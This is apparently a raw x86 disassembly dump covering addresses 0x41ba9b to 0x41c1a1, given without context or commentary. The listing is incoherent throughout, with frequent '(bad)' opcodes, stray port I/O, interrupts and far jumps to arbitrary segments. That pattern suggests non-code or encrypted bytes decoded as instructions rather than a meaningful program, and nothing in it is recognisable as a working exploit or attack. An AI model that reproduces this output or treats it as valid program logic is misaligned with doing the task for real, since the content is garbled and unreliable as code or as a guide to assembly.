  41ba9b:	pop    ebp
  41ba9c:	xchg   DWORD PTR [ebp-0x45],eax
  41ba9f:	shl    BYTE PTR [bx+0x63],cl
  41baa3:	sbb    edx,esi
  41baa5:	arpl   WORD PTR cs:[eax+0x44],ax
  41baa9:	dec    BYTE PTR [edi]
  41baab:	div    BYTE PTR [edx+eax*8+0x58]
  41baaf:	dec    ebx
  41bab0:	xchg   esp,eax
  41bab1:	popf   
  41bab2:	jl     0x41bb16
  41bab4:	sbb    DWORD PTR [edi-0x31],ebx
  41bab7:	push   ds
  41bab8:	lods   eax,DWORD PTR ds:[esi]
  41bab9:	inc    ebx
  41baba:	jl     0x41badf
  41babc:	addr16 std 
  41babe:	lods   al,BYTE PTR ds:[esi]
  41babf:	sub    bh,dh
  41bac1:	mov    dh,0x2
  41bac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bac4:	inc    eax
  41bac5:	sub    al,0x42
  41bac7:	add    BYTE PTR [ecx+esi*2+0x7be3228d],dh
  41bace:	xor    dh,cl
  41bad0:	adc    BYTE PTR [ecx],bl
  41bad2:	cmp    DWORD PTR [esi],eax
  41bad4:	and    dh,ch
  41bad6:	out    dx,al
  41bad7:	push   eax
  41bad8:	cs jo  0xd1ee49a7
  41badf:	imul   ebp,esp,0xffffffd6
  41bae2:	sub    al,0xe2
  41bae4:	xchg   ecx,eax
  41bae5:	push   eax
  41bae6:	mov    dh,0x60
  41bae8:	mov    bh,0x39
  41baea:	cmp    DWORD PTR [esp+ebp*4+0x30e08f8a],eax
  41baf1:	jnp    0x41ba7e
  41baf3:	ss xchg ebx,eax
  41baf5:	ss pop eax
  41baf7:	(bad)
  41bafb:	push   0x5b
  41bafd:	test   al,0x32
  41baff:	lock adc al,0x60
  41bb02:	fwait
  41bb03:	mov    ebp,ebx
  41bb05:	pop    edx
  41bb06:	int    0x3f
  41bb08:	lods   eax,DWORD PTR ds:[esi]
  41bb09:	add    al,0xde
  41bb0b:	ins    DWORD PTR es:[edi],dx
  41bb0c:	cmp    ebp,DWORD PTR [edi]
  41bb0e:	fs or  eax,0xc72cce54
  41bb14:	inc    edx
  41bb15:	sar    BYTE PTR [eax],0xfc
  41bb18:	push   ebp
  41bb19:	fisttp WORD PTR [edx]
  41bb1b:	sbb    BYTE PTR [eax],ah
  41bb1d:	fucomi st,st(3)
  41bb1f:	ror    BYTE PTR [ecx+edi*1-0x2fdfc444],cl
  41bb26:	adc    eax,0x8b991753
  41bb2b:	jbe    0x41baff
  41bb2d:	sub    BYTE PTR [ecx-0x11],ah
  41bb30:	stos   BYTE PTR es:[edi],al
  41bb31:	dec    esp
  41bb32:	stc    
  41bb33:	std    
  41bb34:	cmc    
  41bb35:	popf   
  41bb36:	add    ax,0xe17e
  41bb3a:	jl     0x41bb49
  41bb3c:	push   eax
  41bb3d:	lds    ebp,FWORD PTR [ebx]
  41bb3f:	jnp    0x41bac3
  41bb41:	enter  0xd871,0x19
  41bb45:	mov    edx,0x122bdd28
  41bb4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb4b:	into   
  41bb4c:	fisttp QWORD PTR [eax]
  41bb4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb4f:	xchg   DWORD PTR ds:0x2ad40ca6,eax
  41bb55:	repnz push ebx
  41bb57:	mov    cl,0xce
  41bb59:	mov    cs,esp
  41bb5b:	or     esp,0x94b7f80d
  41bb61:	jnp    0x41bb31
  41bb63:	div    edx
  41bb65:	scas   eax,DWORD PTR es:[edi]
  41bb66:	inc    edx
  41bb67:	leave  
  41bb68:	mov    eax,0x27cfb8a5
  41bb6d:	xchg   esi,eax
  41bb6e:	aas    
  41bb6f:	jmp    0x41bb62
  41bb71:	ss mov bh,0xe8
  41bb74:	mul    bh
  41bb76:	scas   al,BYTE PTR es:[edi]
  41bb77:	adc    eax,0x7ea23164
  41bb7c:	mov    bh,0x20
  41bb7e:	idiv   DWORD PTR [edi]
  41bb80:	sub    al,0x31
  41bb82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb83:	and    BYTE PTR [ebp+0x25],cl
  41bb86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb87:	cld    
  41bb88:	shl    DWORD PTR [eax-0x5e5a4272],0x3b
  41bb8f:	or     DWORD PTR [edx+0x6f8fa599],ebx
  41bb95:	jb     0x41bc09
  41bb97:	xchg   DWORD PTR [esi],ebx
  41bb99:	jae    0x41bb8b
  41bb9b:	mov    dl,dl
  41bb9d:	pop    ebx
  41bb9e:	repnz jmp 0x54cc:0x4778d4c8
  41bba6:	mov    dl,0xf9
  41bba8:	int3   
  41bba9:	retf   
  41bbaa:	push   ecx
  41bbab:	loopne 0x41bbf0
  41bbad:	jno    0x41bba2
  41bbaf:	gs fs dec edi
  41bbb2:	dec    esp
  41bbb3:	inc    esp
  41bbb4:	mov    edi,DWORD PTR [edi]
  41bbb6:	(bad)  
  41bbba:	sub    DWORD PTR [ecx-0x705be818],ecx
  41bbc0:	push   ss
  41bbc1:	jmp    0x41bc2f
  41bbc3:	push   ds
  41bbc4:	jb     0x41bbec
  41bbc6:	arpl   WORD PTR [eax-0x332c472b],cx
  41bbcc:	inc    esi
  41bbcd:	sbb    eax,esp
  41bbcf:	mov    esi,0x2ffb96de
  41bbd4:	out    0x4a,eax
  41bbd6:	stos   DWORD PTR es:[edi],eax
  41bbd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbd8:	imul   esp,DWORD PTR [eax+ebx*8+0x23e2e78b],0xffffffaf
  41bbe0:	push   ss
  41bbe1:	in     eax,0xb2
  41bbe3:	inc    edx
  41bbe4:	lahf   
  41bbe5:	xchg   esi,eax
  41bbe6:	push   ebp
  41bbe7:	or     al,0x6c
  41bbe9:	inc    ebx
  41bbea:	cmp    DWORD PTR [ebp+0x65],ebp
  41bbed:	test   DWORD PTR [esi],eax
  41bbef:	mov    eax,ds:0x504725ea
  41bbf4:	or     BYTE PTR [edi],bl
  41bbf6:	lods   al,BYTE PTR ds:[esi]
  41bbf7:	sub    DWORD PTR [eax-0x468f4eba],eax
  41bbfd:	pop    ebp
  41bbfe:	adc    DWORD PTR [ecx],esp
  41bc00:	in     al,0xd9
  41bc02:	dec    esi
  41bc03:	(bad)  
  41bc04:	fild   WORD PTR [ebx+0x32]
  41bc07:	das    
  41bc08:	jb     0x41bbd9
  41bc0a:	mov    es,WORD PTR [eax]
  41bc0c:	jp     0x41bbea
  41bc0e:	inc    edi
  41bc0f:	shr    DWORD PTR [edx],cl
  41bc11:	push   cs
  41bc12:	adc    eax,0x7aa9a734
  41bc17:	je     0x41bbde
  41bc19:	adc    DWORD PTR [ebp+0x37],ebp
  41bc1c:	pop    esp
  41bc1d:	jge    0x41bc9c
  41bc1f:	adc    cl,ch
  41bc21:	push   esi
  41bc22:	scas   al,BYTE PTR es:[edi]
  41bc23:	dec    edi
  41bc24:	loop   0x41bbff
  41bc26:	jge    0x41bbfb
  41bc28:	je     0x41bc7c
  41bc2a:	or     al,0xc7
  41bc2c:	inc    BYTE PTR [esi+0x13]
  41bc2f:	out    0x59,al
  41bc31:	repnz or eax,0x1748bb76
  41bc37:	pushf  
  41bc38:	call   0x8b30:0xc4f1742
  41bc3f:	xor    dl,ch
  41bc41:	sub    eax,0xe010b1df
  41bc46:	inc    ecx
  41bc47:	(bad)  
  41bc48:	push   0xb7202bca
  41bc4d:	icebp  
  41bc4e:	repz std 
  41bc50:	xchg   edi,eax
  41bc51:	stc    
  41bc52:	outs   dx,BYTE PTR ds:[esi]
  41bc53:	int3   
  41bc54:	clc    
  41bc55:	mov    bh,0xb4
  41bc57:	nop    DWORD PTR [ecx-0x40]
  41bc5b:	push   esp
  41bc5c:	test   BYTE PTR [ebx-0x2f],bh
  41bc5f:	add    al,0x4d
  41bc61:	inc    ebp
  41bc62:	jo     0x41bc8c
  41bc64:	test   BYTE PTR [esi-0x15],ah
  41bc67:	and    BYTE PTR [eax-0x24],dh
  41bc6a:	dec    eax
  41bc6b:	dec    esp
  41bc6c:	adc    al,0xfa
  41bc6e:	and    eax,0x71e99284
  41bc73:	mov    esi,0xac98db52
  41bc78:	je     0x41bc55
  41bc7a:	inc    ecx
  41bc7b:	retf   
  41bc7c:	adc    DWORD PTR [edx-0x4b15b85a],0xffffffa9
  41bc83:	pusha  
  41bc84:	test   DWORD PTR [edi+0x18],esp
  41bc87:	fwait
  41bc88:	rcr    DWORD PTR [ecx+ebx*4+0x1bd5600c],cl
  41bc8f:	adc    BYTE PTR [esi-0x3e],bl
  41bc92:	or     DWORD PTR [edx+0x1504ba0a],ebx
  41bc98:	ins    DWORD PTR es:[edi],dx
  41bc99:	int3   
  41bc9a:	jle    0x41bcaf
  41bc9c:	adc    BYTE PTR [eax-0x21e0f8cf],dh
  41bca2:	and    eax,DWORD PTR [edi]
  41bca4:	cmp    al,0x2a
  41bca6:	sbb    DWORD PTR [ecx+edx*2],0x4ba01ddf
  41bcad:	xchg   BYTE PTR [ecx+ebx*2-0x8],ah
  41bcb1:	pop    eax
  41bcb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcb3:	push   ebp
  41bcb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcb5:	cmc    
  41bcb6:	pop    eax
  41bcb7:	push   esp
  41bcb8:	mov    WORD PTR [eax],?
  41bcba:	mov    ebx,0x39e5b701
  41bcbf:	out    0x8c,eax
  41bcc1:	pop    esi
  41bcc2:	mov    cl,0xcf
  41bcc4:	gs push eax
  41bcc6:	inc    ebx
  41bcc7:	push   esp
  41bcc8:	out    0x2f,al
  41bcca:	or     eax,0x7d5a9d39
  41bccf:	xor    eax,DWORD PTR [edi-0x7442053c]
  41bcd5:	or     BYTE PTR [ebx+0x36e8c3e9],al
  41bcdb:	nop
  41bcdc:	push   ss
  41bcdd:	jge    0x41bd42
  41bcdf:	adc    DWORD PTR [edx+0x146c9996],ebx
  41bce5:	inc    ebp
  41bce6:	sub    BYTE PTR [esi+ebp*1],ch
  41bce9:	out    0xac,eax
  41bceb:	dec    edx
  41bcec:	cmp    BYTE PTR [edx+0x77e9ed09],dl
  41bcf2:	jge    0x41bd11
  41bcf4:	cdq    
  41bcf5:	cmp    esi,edx
  41bcf7:	mov    edi,0x7e855f27
  41bcfc:	push   eax
  41bcfd:	scas   al,BYTE PTR es:[edi]
  41bcfe:	sub    DWORD PTR [edx-0x1e],ebx
  41bd01:	mov    cl,0xe3
  41bd03:	xchg   ebp,eax
  41bd04:	js     0x41bd0d
  41bd06:	cmp    al,0x46
  41bd08:	xlat   BYTE PTR ds:[ebx]
  41bd09:	xlat   BYTE PTR ds:[ebx]
  41bd0a:	mov    ebx,0x6b3d24c0
  41bd0f:	mov    esi,0xa479edcc
  41bd14:	(bad)  
  41bd15:	or     DWORD PTR [ecx-0x6129660b],edx
  41bd1b:	cmp    al,BYTE PTR [ecx]
  41bd1d:	(bad)  
  41bd1e:	push   esi
  41bd1f:	adc    eax,0x395fd71e
  41bd24:	dec    ecx
  41bd25:	add    ecx,edx
  41bd27:	ins    DWORD PTR es:[edi],dx
  41bd28:	iret   
  41bd29:	add    al,0x30
  41bd2b:	(bad)  
  41bd2c:	and    eax,0xec336cb5
  41bd31:	mov    ah,0xfa
  41bd33:	xor    al,0x13
  41bd35:	pusha  
  41bd36:	push   esi
  41bd37:	mov    ecx,0xb74cd903
  41bd3c:	lods   al,BYTE PTR ds:[esi]
  41bd3d:	xchg   edx,eax
  41bd3e:	mov    DWORD PTR [edi+0x10],ebx
  41bd41:	jge    0x41bd47
  41bd43:	inc    edi
  41bd44:	xchg   esp,eax
  41bd45:	xor    eax,0x633b493
  41bd4a:	mov    bh,cl
  41bd4c:	cmp    edi,DWORD PTR [ebx+0x49ed6f45]
  41bd52:	mov    eax,ds:0x935a5cd8
  41bd57:	xor    eax,0x85aca30b
  41bd5c:	not    DWORD PTR [edi]
  41bd5e:	ret    
  41bd5f:	and    al,0xae
  41bd61:	and    cl,BYTE PTR [ebp+0x54]
  41bd64:	mov    esi,0x2fc39c94
  41bd69:	rcr    BYTE PTR [esi+0x543d9c06],1
  41bd6f:	xchg   edi,eax
  41bd70:	mov    ebp,DWORD PTR [edx-0x78524b17]
  41bd76:	add    al,0x33
  41bd78:	and    al,0x5e
  41bd7a:	and    eax,0x3e293e0d
  41bd7f:	ja     0x41bd68
  41bd81:	push   ecx
  41bd82:	dec    edx
  41bd83:	push   edi
  41bd85:	(bad)  
  41bd86:	scas   al,BYTE PTR es:[edi]
  41bd87:	cld    
  41bd88:	enter  0xa3a2,0x34
  41bd8c:	push   ecx
  41bd8d:	mov    ch,0x60
  41bd8f:	cld    
  41bd90:	jle    0x41bdbf
  41bd92:	jne    0x41bd65
  41bd94:	gs xor eax,edx
  41bd97:	mov    ecx,?
  41bd99:	mov    al,ds:0x3c84cc19
  41bd9e:	ficomp DWORD PTR [ecx+edx*1]
  41bda1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bda2:	inc    esi
  41bda3:	xor    eax,0x21d69fc2
  41bda8:	dec    esi
  41bda9:	sti    
  41bdaa:	aam    0x2
  41bdac:	xchg   esp,eax
  41bdad:	sar    BYTE PTR [ebx],0x49
  41bdb0:	sbb    al,0xf1
  41bdb2:	in     eax,dx
  41bdb3:	call   0x8f6925e
  41bdb8:	xchg   DWORD PTR [edi-0x7cb304b1],eax
  41bdbe:	dec    edi
  41bdbf:	pminsw mm3,QWORD PTR [esi-0x7a]
  41bdc3:	bswap  esi
  41bdc5:	and    al,0xa2
  41bdc7:	mov    ds:0xd494090f,al
  41bdcc:	outs   dx,DWORD PTR ds:[esi]
  41bdcd:	pop    ecx
  41bdce:	(bad)  
  41bdcf:	push   ss
  41bdd0:	ins    DWORD PTR es:[edi],dx
  41bdd1:	sub    eax,0xcd76c4bb
  41bdd6:	arpl   cx,dx
  41bdd8:	jmp    FWORD PTR [ebx+0x3d]
  41bddb:	int3   
  41bddc:	nop
  41bddd:	add    edi,DWORD PTR [edi+0x3f552964]
  41bde3:	mov    ah,0xce
  41bde5:	add    eax,0xcd88851e
  41bdea:	push   esi
  41bdeb:	enter  0x32b6,0x3a
  41bdef:	cdq    
  41bdf0:	add    BYTE PTR [edi+0x39],ah
  41bdf3:	xchg   ebx,eax
  41bdf4:	xor    DWORD PTR [ebp-0x6a],edx
  41bdf7:	mov    ds:0xe4706a2e,eax
  41bdfc:	jmp    0x58b3cc33
  41be01:	sub    DWORD PTR [ebx-0xe],ecx
  41be04:	mov    esp,0x381c021a
  41be09:	mov    bl,BYTE PTR [ebx-0x6682ebf0]
  41be0f:	test   DWORD PTR [edi],eax
  41be11:	(bad)  
  41be12:	push   ebx
  41be13:	mov    edi,0x2f9bedfe
  41be18:	pop    ds
  41be19:	inc    ecx
  41be1a:	xor    DWORD PTR [edi-0x3bd390b7],ebp
  41be20:	shl    BYTE PTR [edi-0x47],cl
  41be23:	inc    eax
  41be24:	fcmovbe st,st(6)
  41be26:	bound  ebp,QWORD PTR ds:0x55266f13
  41be2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be2d:	adc    eax,0xc97433af
  41be32:	sub    ebp,DWORD PTR [edi+0x64d41067]
  41be38:	neg    ecx
  41be3a:	cmp    edi,0xffffffe8
  41be3d:	(bad)  
  41be3e:	mov    eax,0xdc16c306
  41be43:	mov    bl,0x52
  41be45:	lods   eax,DWORD PTR ds:[esi]
  41be46:	dec    edi
  41be47:	xlat   BYTE PTR ds:[ebx]
  41be48:	in     al,0xcd
  41be4a:	dec    edi
  41be4b:	in     eax,0x60
  41be4d:	xlat   BYTE PTR ds:[ebx]
  41be4e:	push   esi
  41be4f:	mov    ah,0xe5
  41be51:	dec    eax
  41be52:	(bad)  
  41be53:	out    0x29,al
  41be55:	xchg   ebp,eax
  41be56:	dec    ecx
  41be57:	scas   eax,DWORD PTR es:[edi]
  41be58:	jno    0x41be76
  41be5a:	popa   
  41be5b:	mov    dh,0xf5
  41be5d:	cmp    BYTE PTR [ebx-0x5e],al
  41be60:	popa   
  41be61:	ja     0x41bec0
  41be63:	xchg   ebx,eax
  41be64:	sbb    edi,edi
  41be66:	jmp    0x1ede430c
  41be6b:	fwait
  41be6c:	mov    bh,0xe3
  41be6e:	test   eax,0x7944ea6f
  41be73:	out    dx,eax
  41be74:	mov    al,0xd
  41be76:	das    
  41be77:	(bad)
  41be7a:	retf   
  41be7b:	add    ecx,DWORD PTR ds:0xf9c5ae7
  41be81:	out    dx,al
  41be82:	fs (bad) 
  41be84:	outs   dx,DWORD PTR ds:[esi]
  41be85:	push   ds
  41be86:	je     0x41beb5
  41be88:	imul   BYTE PTR [edi]
  41be8a:	xor    DWORD PTR [ebp+0x77],ecx
  41be8d:	pop    esi
  41be8e:	push   ss
  41be8f:	in     eax,dx
  41be90:	ins    DWORD PTR es:[edi],dx
  41be91:	add    ah,BYTE PTR [edx+0xc]
  41be94:	outs   dx,DWORD PTR ds:[esi]
  41be95:	sub    edx,DWORD PTR [edx+0x33]
  41be98:	popf   
  41be99:	mov    ah,0xdf
  41be9b:	push   eax
  41be9c:	pusha  
  41be9d:	ja     0x41bf0a
  41be9f:	in     al,dx
  41bea0:	shr    dl,0x6d
  41bea3:	shl    DWORD PTR [edx-0x4a],0xae
  41bea7:	cli    
  41bea8:	(bad)  
  41bea9:	push   edi
  41beaa:	xor    al,0xf2
  41beac:	inc    edi
  41bead:	bound  esi,QWORD PTR [edi+0x3a]
  41beb0:	test   DWORD PTR [esi+0x4d0ddf6b],edx
  41beb6:	add    al,0x4
  41beb8:	sti    
  41beb9:	sub    esp,DWORD PTR [esi+0x13]
  41bebc:	pop    ecx
  41bebd:	test   dl,0xa7
  41bec0:	cmp    al,0xe7
  41bec2:	(bad)  
  41bec3:	sbb    BYTE PTR [ebx-0x589fbf48],bh
  41bec9:	lahf   
  41beca:	retf   
  41becb:	xchg   edx,eax
  41becc:	int    0x1d
  41bece:	cwde   
  41becf:	leave  
  41bed0:	add    edi,DWORD PTR [edx]
  41bed2:	jmp    0x41be62
  41bed4:	dec    ecx
  41bed5:	call   0x6330d740
  41beda:	and    al,dh
  41bedc:	inc    ebp
  41bedd:	add    al,0x9
  41bedf:	add    al,0x65
  41bee1:	xor    al,0xc1
  41bee3:	call   0x83f9:0x9437a44
  41beea:	mov    ebp,0xf788529
  41beef:	mov    edx,0x61c1f2c4
  41bef4:	adc    ebx,ecx
  41bef6:	jns    0x41bf34
  41bef8:	rol    ebx,cl
  41befa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41befb:	mov    al,ds:0x76ad9ad2
  41bf00:	jne    0x41bf65
  41bf02:	loopne 0x41bf07
  41bf04:	add    al,0x8b
  41bf06:	lea    ebx,[eax]
  41bf08:	fcomp  DWORD PTR [ebx]
  41bf0a:	xchg   edx,eax
  41bf0b:	sbb    esi,ebp
  41bf0d:	ins    DWORD PTR es:[edi],dx
  41bf0e:	fbstp  TBYTE PTR [ecx-0x22258abb]
  41bf14:	cmp    edi,0x42
  41bf17:	call   ecx
  41bf19:	push   0xffffffba
  41bf1b:	addr16 pop ss
  41bf1d:	jns    0x41bed9
  41bf1f:	mov    ds:0xed65144c,al
  41bf24:	dec    ecx
  41bf25:	push   esp
  41bf26:	les    esp,FWORD PTR [edx+0xf]
  41bf29:	pop    ebp
  41bf2a:	xchg   ebp,eax
  41bf2b:	push   cs
  41bf2c:	xchg   edi,eax
  41bf2d:	sahf   
  41bf2e:	inc    edx
  41bf2f:	sub    eax,0x2866ad72
  41bf34:	inc    DWORD PTR [eax-0x17a724f3]
  41bf3a:	dec    edi
  41bf3b:	scas   al,BYTE PTR es:[edi]
  41bf3c:	inc    ebx
  41bf3d:	push   ebp
  41bf3e:	enter  0x890c,0xa3
  41bf42:	xchg   ecx,eax
  41bf43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf44:	push   ebx
  41bf45:	rcr    DWORD PTR ds:0x2bd2b1fc,0x22
  41bf4c:	dec    esp
  41bf4d:	add    esp,edx
  41bf4f:	add    al,0x1b
  41bf51:	lds    esi,FWORD PTR [ebp-0x57852806]
  41bf57:	sub    DWORD PTR [ebp+edx*1+0x3909c2e3],ecx
  41bf5e:	xor    al,0xbb
  41bf60:	inc    ebp
  41bf61:	dec    edi
  41bf62:	mov    ds:0xec1ca592,eax
  41bf67:	je     0x41bf3e
  41bf69:	mov    edi,0xfc3f298b
  41bf6e:	hlt    
  41bf6f:	push   ebx
  41bf70:	popa   
  41bf71:	xchg   edx,eax
  41bf72:	xchg   edi,eax
  41bf73:	jge    0x41bf9a
  41bf75:	xchg   ecx,eax
  41bf76:	adc    BYTE PTR [edx],al
  41bf78:	and    BYTE PTR [eax+0x9240621],bh
  41bf7e:	lea    ecx,[edi+0x34]
  41bf81:	xor    ebx,0xffffffb2
  41bf84:	pop    eax
  41bf85:	es cs inc eax
  41bf88:	ret    
  41bf89:	add    eax,0x334f29d2
  41bf8e:	xor    BYTE PTR fs:[edi],dl
  41bf91:	xchg   ecx,eax
  41bf92:	gs pop ds
  41bf94:	sbb    BYTE PTR [esp+ecx*1+0x5e],bl
  41bf98:	sub    eax,0xbdf36ff
  41bf9d:	jae    0x41bf4f
  41bf9f:	nop
  41bfa0:	repz fld DWORD PTR [edx+eax*2]
  41bfa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfa5:	dec    eax
  41bfa6:	out    0x54,al
  41bfa8:	mov    edx,DWORD PTR [ebx-0x2221da92]
  41bfae:	(bad)  
  41bfaf:	rcr    DWORD PTR [ebp-0x3b],cl
  41bfb2:	or     DWORD PTR [eax],ebp
  41bfb4:	push   esp
  41bfb5:	dec    ebx
  41bfb6:	inc    ebp
  41bfb7:	aad    0x6f
  41bfb9:	gs hlt 
  41bfbb:	jecxz  0x41bff1
  41bfbd:	sti    
  41bfbe:	cs fisttp DWORD PTR gs:[esi+0x60b469f6]
  41bfc6:	jl     0x41bf67
  41bfc8:	xchg   esi,eax
  41bfc9:	mov    ebp,0x1cbceb21
  41bfce:	mov    cl,0x44
  41bfd0:	(bad)  
  41bfd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfd2:	mov    ds:0x7dd263aa,al
  41bfd7:	sbb    BYTE PTR [ebp+0x28ec0eee],dl
  41bfdd:	cwde   
  41bfde:	hlt    
  41bfdf:	jp     0x41c060
  41bfe1:	lock pop eax
  41bfe3:	test   eax,0x49d76794
  41bfe8:	inc    edi
  41bfe9:	cs out 0xac,al
  41bfec:	test   al,0x16
  41bfee:	cmp    eax,0xc186bf83
  41bff3:	retf   0x7312
  41bff6:	adc    al,0x52
  41bff8:	pushf  
  41bff9:	sti    
  41bffa:	and    DWORD PTR [ebx+0x69718738],edi
  41c000:	pop    ds
  41c001:	pop    esi
  41c002:	jbe    0x41c061
  41c004:	mov    ch,0x5c
  41c006:	pop    ebx
  41c007:	jle    0x41bfeb
  41c009:	or     edi,DWORD PTR [eax]
  41c00b:	inc    edi
  41c00c:	dec    ebp
  41c00d:	in     eax,0x80
  41c00f:	mov    BYTE PTR [ecx-0x785376f9],bl
  41c015:	fcomp  st(6)
  41c017:	and    ah,BYTE PTR ds:0x115bfdc7
  41c01d:	adc    BYTE PTR [edx+0x45],0x1c
  41c021:	mov    al,ds:0xf390c87f
  41c026:	cmp    BYTE PTR [ebx+ecx*8-0x4f],bl
  41c02a:	popf   
  41c02b:	pop    es
  41c02c:	dec    edx
  41c02d:	(bad)  
  41c02f:	aad    0xa6
  41c031:	gs mov esi,0xffd64975
  41c037:	fwait
  41c038:	jge    0x41c048
  41c03a:	fs adc eax,0xaebc2b33
  41c040:	and    al,ch
  41c042:	cmp    al,BYTE PTR [ebx-0x1]
  41c045:	outs   dx,DWORD PTR ds:[esi]
  41c046:	dec    ebx
  41c047:	out    0x3e,eax
  41c049:	clc    
  41c04a:	ds push ebp
  41c04c:	in     al,0xaa
  41c04e:	jge    0x41c06e
  41c050:	not    ebp
  41c052:	dec    edi
  41c053:	fild   WORD PTR ds:0x573e45a4
  41c059:	push   cs
  41c05a:	push   ds
  41c05b:	pop    esi
  41c05c:	push   eax
  41c05d:	imul   bx,WORD PTR [esi+0x4d],0xfff4
  41c062:	sub    eax,0x252fa8af
  41c067:	mov    bh,0x6a
  41c069:	xchg   edi,eax
  41c06a:	out    dx,eax
  41c06b:	push   ebp
  41c06c:	mov    ah,0xc4
  41c06e:	and    cl,BYTE PTR [esi-0x73]
  41c071:	mov    dh,0x81
  41c073:	fcomp  DWORD PTR [eax-0x2f]
  41c076:	pop    eax
  41c077:	fimul  DWORD PTR [bp+si]
  41c07a:	daa    
  41c07b:	pop    ebp
  41c07c:	in     al,dx
  41c07d:	jle    0x41c06e
  41c07f:	loopne 0x41c0b7
  41c081:	mov    dh,BYTE PTR [edi+0x2c]
  41c084:	retf   0xf90b
  41c087:	inc    ebp
  41c088:	or     eax,0xf615a6ba
  41c08d:	sar    DWORD PTR [edx],0xfc
  41c090:	jo     0x41c065
  41c092:	fcom   QWORD PTR [ecx+0x48]
  41c095:	iret   
  41c096:	nop
  41c097:	in     al,dx
  41c098:	mov    ds,WORD PTR [edx-0x61]
  41c09b:	sbb    ebp,DWORD PTR [ebp-0x35]
  41c09e:	out    0x76,eax
  41c0a0:	jl     0x41c0db
  41c0a2:	xchg   ebx,eax
  41c0a3:	cmp    esp,edx
  41c0a5:	dec    edx
  41c0a6:	aas    
  41c0a7:	cmp    al,0x48
  41c0a9:	mov    al,0x76
  41c0ab:	mov    ebp,DWORD PTR [ebp-0xe17b1d5]
  41c0b1:	ins    DWORD PTR es:[edi],dx
  41c0b2:	aaa    
  41c0b3:	adc    al,dh
  41c0b5:	sub    al,0x48
  41c0b7:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41c0b9:	and    al,0xfe
  41c0bb:	jnp    0x41c100
  41c0bd:	int3   
  41c0be:	or     eax,DWORD PTR [esi-0x58]
  41c0c1:	xchg   ebx,eax
  41c0c2:	jmp    0xb270:0xb372d8cf
  41c0c9:	sbb    DWORD PTR [ecx+0x46],ebx
  41c0cc:	or     DWORD PTR [ebp+ebp*8+0x67cf74fb],esp
  41c0d3:	or     ch,ah
  41c0d5:	stc    
  41c0d6:	jno    0x41c139
  41c0d8:	cdq    
  41c0d9:	ss scas eax,DWORD PTR es:[edi]
  41c0db:	xor    DWORD PTR [eax+0x38],edi
  41c0de:	sbb    al,0x14
  41c0e0:	push   0x8eddf0c3
  41c0e5:	daa    
  41c0e6:	cli    
  41c0e7:	icebp  
  41c0e8:	mov    ebp,0x37152070
  41c0ed:	xchg   edi,eax
  41c0ee:	out    dx,al
  41c0ef:	xchg   ebx,eax
  41c0f0:	pop    es
  41c0f1:	fcom   QWORD PTR [ecx]
  41c0f3:	push   eax
  41c0f4:	ds in  al,dx
  41c0f6:	rcl    DWORD PTR [eax],cl
  41c0f8:	ror    DWORD PTR [eax+ecx*4-0xc],0x95
  41c0fd:	(bad)  
  41c0fe:	jge    0x41c090
  41c100:	loop   0x41c10d
  41c102:	adc    DWORD PTR [eax+0x26],0xf66e5fe9
  41c109:	xor    edx,esi
  41c10b:	je     0x41c137
  41c10d:	in     eax,dx
  41c10e:	mov    ds:0xaec186d2,al
  41c113:	mov    ecx,0x6c8a77c8
  41c118:	cmp    edi,edx
  41c11a:	loopne 0x41c0c6
  41c11c:	sub    dl,BYTE PTR [ebx+esi*8]
  41c11f:	shr    DWORD PTR [ebp-0x4c],1
  41c122:	aam    0xb6
  41c124:	bound  ebp,QWORD PTR [eax-0x1b]
  41c127:	retf   0x624
  41c12a:	jb     0x41c138
  41c12c:	outs   dx,BYTE PTR ds:[esi]
  41c12d:	cld    
  41c12e:	pushf  
  41c12f:	mov    BYTE PTR [eax+0x4dade6a4],bl
  41c135:	daa    
  41c136:	xor    al,BYTE PTR [ebx+0x3460858a]
  41c13c:	push   edx
  41c13d:	push   eax
  41c13e:	add    al,0x96
  41c140:	int    0xc9
  41c142:	jmp    FWORD PTR [eax-0x2ef053fe]
  41c148:	inc    ecx
  41c149:	jb     0x41c139
  41c14b:	lahf   
  41c14c:	fld    QWORD PTR [edx]
  41c14e:	ins    BYTE PTR es:[edi],dx
  41c14f:	les    edx,FWORD PTR [ebx+0x24559056]
  41c155:	inc    edx
  41c156:	mov    edx,0x550712d3
  41c15b:	and    al,0xad
  41c15d:	mov    esi,0x1647f609
  41c162:	popf   
  41c163:	dec    ecx
  41c164:	in     al,0x85
  41c166:	jge    0x41c111
  41c168:	div    BYTE PTR [ecx+0x19]
  41c16b:	dec    esi
  41c16c:	fst    DWORD PTR [edi]
  41c16e:	lahf   
  41c16f:	mov    WORD PTR [ebx],ss
  41c171:	in     al,0x24
  41c173:	adc    al,0x78
  41c175:	cmp    DWORD PTR [ebx+0x1b],eax
  41c178:	stc    
  41c179:	(bad)  
  41c17a:	xlat   BYTE PTR ds:[ebx]
  41c17b:	push   esp
  41c17c:	hlt    
  41c17d:	mov    edx,0xce7c4c1f
  41c182:	sub    al,0xa2
  41c184:	push   0x7e
  41c186:	ins    DWORD PTR es:[edi],dx
  41c187:	add    DWORD PTR [ebx-0x35],edi
  41c18a:	and    al,0x33
  41c18c:	(bad)  
  41c18d:	xchg   edx,eax
  41c18e:	lock xor edx,DWORD PTR fs:[ebp+0x37]
  41c193:	xchg   edi,eax
  41c194:	mov    cl,0x55
  41c196:	pop    edi
  41c197:	(bad)  
  41c198:	cmp    eax,0x91b3d0bc
  41c19d:	push   ds
  41c19e:	push   ebp
  41c19f:	in     al,dx
  41c1a0:	std    
  41c1a1:	sbb    eax,0x679e5267
